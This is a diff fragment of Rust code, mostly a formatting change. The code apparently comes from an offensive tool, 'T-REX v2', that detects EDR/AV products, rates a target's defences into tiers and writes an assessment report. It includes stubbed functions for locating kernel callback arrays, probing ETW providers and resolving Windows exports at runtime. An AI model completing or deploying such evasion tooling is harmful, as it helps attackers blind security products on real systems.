-unsafe fn find_callback_array(_ntos: u64, _rw: &dyn KernelReadWrite) -> Option<u64> { None }
-unsafe fn probe_etw_provider_enabled(_guid: &[u8; 16]) -> bool { false }
+unsafe fn query_system_module_info() -> *mut u8 {
+    core::ptr::null_mut()
+}
+unsafe fn query_system_code_integrity() -> *mut CodeIntegrityInfo {
+    core::ptr::null_mut()
+}
+unsafe fn get_ntoskrnl_base() -> Option<u64> {
+    None
+}
+unsafe fn find_callback_array(_ntos: u64, _rw: &dyn KernelReadWrite) -> Option<u64> {
+    None
+}
+unsafe fn probe_etw_provider_enabled(_guid: &[u8; 16]) -> bool {
+    false
+}
 
-#[repr(C)] struct CodeIntegrityInfo { code_integrity_options: u32, _pad: [u32; 4] }
+#[repr(C)]
+struct CodeIntegrityInfo {
+    code_integrity_options: u32,
+    _pad: [u32; 4],
+}
 
-fn alloc(_sz: usize) -> *mut u8 { core::ptr::null_mut() }
+fn alloc(_sz: usize) -> *mut u8 {
+    core::ptr::null_mut()
+}
 fn free(_p: *mut u8) {}
 fn merge_or_push(products: &mut Vec<DetectedProduct>, product: DetectedProduct) {
     for p in products.iter_mut() {
@@ -887,7 +1146,11 @@ trait Max {
 }
 impl Max for ThreatTier {
     fn max(self, other: Self) -> Self {
-        if (other as u8) > (self as u8) { other } else { self }
+        if (other as u8) > (self as u8) {
+            other
+        } else {
+            self
+        }
     }
 }
 
@@ -918,10 +1181,21 @@ unsafe fn write_report(a: &TargetAssessment) {
     let ch = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle")
         .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"CloseHandle"));
 
-    let (Some(cf), Some(wf), Some(ch)) = (cf, wf, ch) else { return };
+    let (Some(cf), Some(wf), Some(ch)) = (cf, wf, ch) else {
+        return;
+    };
 
-    type FnCF = unsafe extern "system" fn(*const u16, u32, u32, *mut c_void, u32, u32, *mut c_void) -> *mut c_void;
-    type FnWF = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
+    type FnCF = unsafe extern "system" fn(
+        *const u16,
+        u32,
+        u32,
+        *mut c_void,
+        u32,
+        u32,
+        *mut c_void,
+    ) -> *mut c_void;
+    type FnWF =
+        unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
     type FnCH = unsafe extern "system" fn(*mut c_void) -> i32;
 
     let create: FnCF = core::mem::transmute(cf);
@@ -931,15 +1205,33 @@ unsafe fn write_report(a: &TargetAssessment) {
     let path: [u16; 48] = {
         let s = b"C:\\nyx\\trex_report.txt";
         let mut a = [0u16; 48];
-        for i in 0..s.len() { a[i] = s[i] as u16; }
+        for i in 0..s.len() {
+            a[i] = s[i] as u16;
+        }
         a
     };
 
-    let h = create(path.as_ptr(), 0x4000_0000, 0, core::ptr::null_mut(), 2, 0x80, core::ptr::null_mut());
-    if h as isize == -1 || h.is_null() { return; }
+    let h = create(
+        path.as_ptr(),
+        0x4000_0000,
+        0,
+        core::ptr::null_mut(),
+        2,
+        0x80,
+        core::ptr::null_mut(),
+    );
+    if h as isize == -1 || h.is_null() {
+        return;
+    }
 
     let mut written: u32 = 0;
-    let _ = write(h, b"=== T-REX v2 Assessment ===\r\n".as_ptr(), 28, &mut written, core::ptr::null_mut());
+    let _ = write(
+        h,
+        b"=== T-REX v2 Assessment ===\r\n".as_ptr(),
+        28,
+        &mut written,
+        core::ptr::null_mut(),
+    );
     // Tier
     let tier_str = match a.tier {
         ThreatTier::Clean => "Tier: Clean (0) - No EDR/AV detected\r\n",
@@ -949,19 +1241,55 @@ unsafe fn write_report(a: &TargetAssessment) {
         ThreatTier::Fortress => "Tier: Fortress (4) - HVCI+CET+CFG strict\r\n",
         _ => "Tier: Unknown\r\n",
     };
-    let _ = write(h, tier_str.as_ptr(), tier_str.len() as u32, &mut written, core::ptr::null_mut());
+    let _ = write(
+        h,
+        tier_str.as_ptr(),
+        tier_str.len() as u32,
+        &mut written,
+        core::ptr::null_mut(),
+    );
     let prod_count = a.products.len();
-    let _ = write(h, b"Products detected: ".as_ptr(), 19, &mut written, core::ptr::null_mut());
+    let _ = write(
+        h,
+        b"Products detected: ".as_ptr(),
+        19,
+        &mut written,
+        core::ptr::null_mut(),
+    );
     let count_byte = [b'0' + (prod_count as u8).min(9), b'\r', b'\n'];
-    let _ = write(h, count_byte.as_ptr(), 3, &mut written, core::ptr::null_mut());
+    let _ = write(
+        h,
+        count_byte.as_ptr(),
+        3,
+        &mut written,
+        core::ptr::null_mut(),
+    );
     for p in a.products.iter() {
         let name = p.vendor.default_name();
         let _ = write(h, b"  - ".as_ptr(), 4, &mut written, core::ptr::null_mut());
-        let _ = write(h, name.as_ptr(), name.len() as u32, &mut written, core::ptr::null_mut());
+        let _ = write(
+            h,
+            name.as_ptr(),
+            name.len() as u32,
+            &mut written,
+            core::ptr::null_mut(),
+        );
         let _ = write(h, b"\r\n".as_ptr(), 2, &mut written, core::ptr::null_mut());
     }
-    let _ = write(h, b"\r\nRecommendation: ".as_ptr(), 17, &mut written, core::ptr::null_mut());
-    let _ = write(h, a.recommendation.as_ptr(), a.recommendation.len() as u32, &mut written, core::ptr::null_mut());
+    let _ = write(
+        h,
+        b"\r\nRecommendation: ".as_ptr(),
+        17,
+        &mut written,
+        core::ptr::null_mut(),
+    );
+    let _ = write(
+        h,
+        a.recommendation.as_ptr(),
+        a.recommendation.len() as u32,
+        &mut written,
+        core::ptr::null_mut(),
+    );
     let _ = write(h, b"\r\n".as_ptr(), 2, &mut written, core::ptr::null_mut());
 }
 
@@ -971,7 +1299,14 @@ fn format_tier_num(t: u32) -> [u8; 8] {
     buf[0] = b'(';
     let mut n = t;
     let mut i = 7usize;
-    loop { buf[i] = b'0' + (n % 10) as u8; n /= 10; if n == 0 { break; } i -= 1; }
+    loop {
+        buf[i] = b'0' + (n % 10) as u8;
+        n /= 10;
+        if n == 0 {
+            break;
+        }
+        i -= 1;
+    }
     buf[7] = b')';
     buf
 }
@@ -984,5 +1319,7 @@ unsafe fn exit_process(code: u32) -> ! {
         let f: FnExit = core::mem::transmute(a);
         f(code);
     }
-    loop { core::hint::spin_loop(); }
+    loop {
+        core::hint::spin_loop();
+    }
 }
